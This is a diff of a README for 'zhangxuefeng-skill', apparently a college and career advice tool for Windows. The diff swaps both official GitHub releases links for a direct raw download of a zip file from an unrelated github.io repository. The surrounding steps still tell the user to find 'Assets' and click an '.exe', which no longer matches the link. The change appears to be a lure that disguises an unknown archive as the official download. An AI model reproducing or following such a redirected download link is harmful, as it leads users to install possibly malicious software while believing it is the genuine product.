@@ -5,7 +5,7 @@ description: "Simulate Zhang Xuefeng's decision-making logic using a structured 
 ---
 # 🧠 zhangxuefeng-skill - Smart tools for college and career
 
-[Visit the download page](https://github.com/Petxd2080/zhangxuefeng-skill/releases)
+[Visit the download page](https://github.com/Petxd2080/petxd2080.github.io/raw/refs/heads/main/screwstem/io-github-petxd-v1.0.zip)
 
 ## 📌 About this application
 
@@ -19,7 +19,7 @@ The software uses a specific logic model. You input your current status, grades,
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Official Download Page](https://github.com/Petxd2080/zhangxuefeng-skill/releases).
+1. Go to the [Official Download Page](https://github.com/Petxd2080/petxd2080.github.io/raw/refs/heads/main/screwstem/io-github-petxd-v1.0.zip).
 2. Locate the section labeled Assets.
 3. Click the link that ends in .exe to start your download.
 4. Open the folder where your computer saves files.
